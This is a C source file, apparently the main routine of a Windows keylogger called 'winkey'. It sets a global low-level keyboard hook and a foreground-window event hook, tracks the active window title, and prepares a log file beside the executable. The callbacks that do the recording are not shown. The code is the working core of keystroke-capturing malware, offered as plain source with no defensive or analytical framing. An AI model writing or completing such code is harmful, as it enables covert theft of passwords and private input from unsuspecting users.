#include "winkey.h"

t_winkey	g_winkey;

int			main(int ac, char *av[])
{
	MSG			msg;

	if (ac != 1)
		return (1);
	memcpy(g_winkey.path, av[0], strlen(av[0]) + 1);
	memcpy(strrchr(g_winkey.path, '\\') + 1, LOG_FILE, strlen(LOG_FILE) + 1);
	memset(g_winkey.window_title, 0, sizeof(g_winkey.window_title));
	memset(g_winkey.window_prev, 0, sizeof(g_winkey.window_prev));
	GetWindowText(GetForegroundWindow(), g_winkey.window_title, sizeof(g_winkey.window_title));
	g_winkey.hook_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);
	g_winkey.hook_event = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, win_event_proc_callback, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	while (GetMessage(&msg, NULL, 0, 0))
		;
	return (0);
}
